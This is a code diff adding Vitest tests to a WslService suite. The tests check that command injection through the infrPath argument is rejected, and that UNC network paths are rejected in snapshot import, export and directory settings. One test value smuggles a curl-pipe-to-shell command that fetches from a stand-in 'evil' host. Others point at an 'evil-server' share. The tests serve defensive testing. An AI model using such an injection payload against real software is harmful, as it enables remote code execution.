@@ -1,4 +1,5 @@
 import { describe, expect, it } from 'vitest';
+import path from 'path';
 import { WslService } from './WslService';
 
 describe('WslService', () => {
@@ -101,5 +102,30 @@ describe('WslService', () => {
     const badTypeRes = await service.runInfrSetupScript('unknown' as any, { distro: 'ubuntu' });
     expect(badTypeRes.success).toBe(false);
     expect(badTypeRes.output).toContain('desconhecido');
+  });
+
+  it('rejeita infrPath com metacaracteres de shell em runInfrSetupScript (proteção contra injeção de comando)', async () => {
+    const service = new WslService();
+    const res = await service.runInfrSetupScript('oracle', {
+      distro: 'Ubuntu-20.04',
+      infrPath: 'C:\\x" ; curl http://evil/x|sh #'
+    });
+    expect(res.success).toBe(false);
+    expect(res.output).toContain('inválido');
+  });
+
+  it('rejeita caminhos de rede (UNC) em importSnapshot/exportSnapshot/setSnapshotsDir (proteção contra path traversal)', async () => {
+    const service = new WslService();
+    const existingFile = path.join(process.cwd(), 'package.json');
+
+    const importRes = await service.importSnapshot('Ubuntu-20.04', '\\\\evil-server\\share\\wsl', existingFile);
+    expect(importRes.success).toBe(false);
+    expect(importRes.error).toContain('inválido');
+
+    const exportRes = await service.exportSnapshot('Ubuntu-20.04', '\\\\evil-server\\share\\out.tar');
+    expect(exportRes.success).toBe(false);
+    expect(exportRes.error).toContain('inválido');
+
+    expect(service.setSnapshotsDir('\\\\evil-server\\share')).toBe(false);
   });
 });
